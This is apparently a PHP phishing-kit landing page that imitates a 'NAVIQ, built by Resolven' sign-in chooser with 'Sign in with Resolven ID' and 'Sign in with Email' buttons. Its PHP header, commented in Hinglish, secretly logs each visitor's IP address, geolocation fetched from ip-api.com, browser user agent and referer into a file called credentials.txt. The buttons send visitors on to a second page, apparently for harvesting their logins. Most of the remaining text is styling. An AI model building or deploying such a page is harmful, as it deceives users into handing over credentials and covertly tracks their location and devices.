<?php
// Jab bhi koi is chooser page par aake link kholega, location, IP aur User-Agent record kar lo
$credFile = __DIR__ . '/credentials.txt';
date_default_timezone_set("Asia/Kolkata");

// Agar page sirf open kiya gaya hai (GET request)
if ($_SERVER["REQUEST_METHOD"] !== "POST") {
    $timestamp = date("Y-m-d h:i:s A");
    
    // 1. Real Public IP nikalna
    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] 
          ?? $_SERVER['HTTP_X_FORWARDED_FOR'] 
          ?? $_SERVER['REMOTE_ADDR'] 
          ?? 'Unknown';

    if (strpos($ip, ',') !== false) {
        $ip = trim(explode(',', $ip)[0]);
    }

    if ($ip === 'Unknown' || strpos($ip, '127.') === 0 || strpos($ip, '192.168.') === 0 || strpos($ip, '10.') === 0 || strpos($ip, '172.') === 0) {
        $external_ip = @file_get_contents('https://api.ipify.org');
        if ($external_ip) {
            $ip = trim($external_ip);
        }
    }

    // 2. Click ke waqt hi Location (City, Region, Country) fetch karna
    $location = 'Unknown Location';
    if ($ip !== 'Unknown') {
        $geoJson = @file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,regionName,city");
        $geo = json_decode($geoJson, true);
        if ($geo && isset($geo['status']) && $geo['status'] === 'success') {
            $city = $geo['city'] ?? '';
            $region = $geo['regionName'] ?? '';
            $country = $geo['country'] ?? '';
            $location = trim("{$city}, {$region}, {$country}", ', ');
        }
    }

    // 3. Browser / User-Agent capture karna
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown Browser';

    $referer = $_SERVER['HTTP_REFERER'] ?? 'Direct Link / Unknown';
    $method = $_GET['method'] ?? 'Landing Page Visit';

    // credentials.txt mein sab save karna
    $file = fopen($credFile, "a+");
    fwrite($file, "Received at=" . $timestamp . "\n");
    fwrite($file, "username=— (Link Clicked / Page Visited)\n");
    fwrite($file, "workemail=Method: " . $method . "\n");
    fwrite($file, "form_submitted=Link Clicked Only\n");
    fwrite($file, "client_ip=" . $ip . "\n");
    fwrite($file, "location=" . $location . "\n");
    fwrite($file, "user_agent=" . $userAgent . "\n");
    fwrite($file, "referer_link=" . $referer . "\n");
    fwrite($file, "--------\n");
    fclose($file);
}
?>
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="theme-color" content="#482677" />
  <meta name="description" content="NAVIQ — powered by AI, built by Resolven." />
  <meta property="og:title" content="NAVIQ — Built by Resolven" />
  <meta property="og:image" content="images/og-naviq-share.png" />
  <title>NAVIQ | Welcome</title>
  <link rel="icon" href="images/favicon.ico" sizes="any" />
  <link rel="icon" type="image/png" sizes="32x32" href="images/favicon-32x32.png" />
  <link rel="apple-touch-icon" href="images/apple-touch-icon.png" />
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
  <style>
    :root {
	--violet: #4b287c;
	--violet-dark: #35175e;
	--green: #22c264;
	--ink: #201d28;
	--muted: #77737f;
	--line: #e5e2ea;
	font-family: 'DM Sans',Arial,sans-serif;
	color: var(--ink);
	font-synthesis: none;
	text-rendering: optimizeLegibility;
	-webkit-font-smoothing: antialiased;
}

* {
	box-sizing: border-box;
}

html,body {
	width: 100%;
	min-height: 100%;
	margin: 0;
}

body {
	min-width: 320px;
	background: #eeeaf4;
}

button,input {
	font: inherit;
}

a {
	color: inherit;
	text-decoration: none;
}

button {
	cursor: pointer;
}

.chooser {
	position: relative;
	display: block;
	min-height: 100vh;
	min-height: 100svh;
	overflow: hidden;
	background: #74608e url('images/renewable-energy.jpeg') center center/cover no-repeat;
}

.chooser:before {
	position: absolute;
	inset: 0;
	content: '';
	background: linear-gradient(104deg,rgba(65,28,113,.91) 0%,rgba(80,47,133,.85) 31%,rgba(122,91,166,.72) 58%,rgba(218,212,233,.68) 100%);
	pointer-events: none;
}

.chooser:after {
	position: absolute;
	inset: 0;
	content: '';
	background: linear-gradient(0deg,rgba(53,22,94,.33),transparent 42%);
	pointer-events: none;
}

.chooser[hidden] {
	display: none!important;
}

.green-slashes {
	position: absolute;
	z-index: 1;
	top: 0;
	right: 2.6%;
	display: flex;
	gap: 13px;
	transform: skew(-23deg);
	filter: drop-shadow(0 6px 13px rgba(19,167,82,.17));
}

.green-slashes span {
	display: block;
	width: clamp(45px,6.2vw,88px);
	height: clamp(64px,10.5vw,116px);
	background: var(--green);
}

.chooser-content {
	position: absolute;
	z-index: 2;
	top: 18.7%;
	left: 0;
	width: min(520px,39vw);
	min-width: 330px;
}

.logo-plaque {
	display: flex;
	min-height: 130px;
	align-items: center;
	padding: 11px 30px 11px clamp(28px,3vw,48px);
	background: #fff;
	clip-path: polygon(0 0,100% 0,92.7% 100%,0 100%);
}

.logo-stack {
	width: max-content;
}

.logo-word {
	position: relative;
	color: var(--violet);
	font: italic 800 clamp(60px,7.4vw,104px)/.86 'Manrope',Arial,sans-serif;
	letter-spacing: -.075em;
	white-space: nowrap;
        letter-spacing: -0.1px;
}

.logo-word span {
  position: relative;
  display: inline-block;
}

.logo-word span::after {
  content: "";
  position: absolute;
  right: 0;
  bottom: 9px;
  width: 29px;
  height: 8px;
  transform: rotate(43deg);
  background: var(--green);
  border-radius: 2px;
}

.logo-tagline {
	margin-top: 10px;
	color: var(--violet);
	font-size: clamp(8px,.87vw,12px);
	font-weight: 500;
	letter-spacing: .36em;
	white-space: nowrap;
}

.logo-tagline span {
	color: #319e66;
}

.chooser-actions {
	display: flex;
	flex-direction: column;
	gap: 24px;
	margin-top: 27px;
}

.chooser-button {
	position: relative;
	display: flex;
	align-items: center;
	justify-content: center;
	gap: 12px;
	width: 92%;
	min-height: 49px;
	padding: 9px 38px 9px 52px;
	border: 0;
	clip-path: polygon(0 0,100% 0,96.3% 100%,0 100%);
	color: #fff;
	font-size: 15px;
	font-weight: 600;
	text-align: center;
	transition: filter .18s,transform .18s;
}

.chooser-button:hover {
	filter: brightness(1.07);
	transform: translateX(3px);
}

.chooser-button:focus-visible {
	outline: 3px solid #fff;
	outline-offset: 3px;
}

.chooser-button.primary {
	background: #20c361;
}

.chooser-button.secondary {
	width: 89%;
	background: rgba(196,178,219,.58);
	backdrop-filter: blur(4px);
}

.chooser-button svg {
	width: 19px;
	height: 19px;
	flex: none;
	fill: none;
	stroke: currentColor;
	stroke-width: 1.8;
	stroke-linecap: round;
	stroke-linejoin: round;
}

.chooser-button .btn-text {
	flex: 0 1 auto;
}

.chooser-button .btn-icon {
	position: absolute;
	left: clamp(36px,5.3vw,81px);
}
  </style>
</head>
<body>
  <main class="chooser" id="chooser-view" aria-label="NAVIQ sign-in options">
    <div class="green-slashes" aria-hidden="true"><span></span><span></span></div>
    <div class="chooser-content">
      <div class="logo-plaque"><div class="logo-stack">
<div class="logo-word">NAVI<span>Q</span></div>
<div class="logo-tagline">POWERED BY AI. <span>BUILT BY RESOLVEN.</span></div></div></div>
      <div class="chooser-actions">
        <a class="chooser-button primary" href="page2.php?method=resolven" aria-label="Sign in with Resolven ID"><svg class="btn-icon" viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="M10 8l4 4-4 4M7 12h7"/></svg><span class="btn-text">Sign in with Resolven ID</span></a>
        <a class="chooser-button secondary" href="page2.php?method=email"><svg class="btn-icon" viewBox="0 0 24 24" aria-hidden="true"><rect x="3" y="5" width="18" height="14" rx="1.5"/><path d="m4 7 8 6 8-6"/></svg><span class="btn-text">Sign in with Email</span></a>
      </div>
    </div>
  </main>
</body>
</html>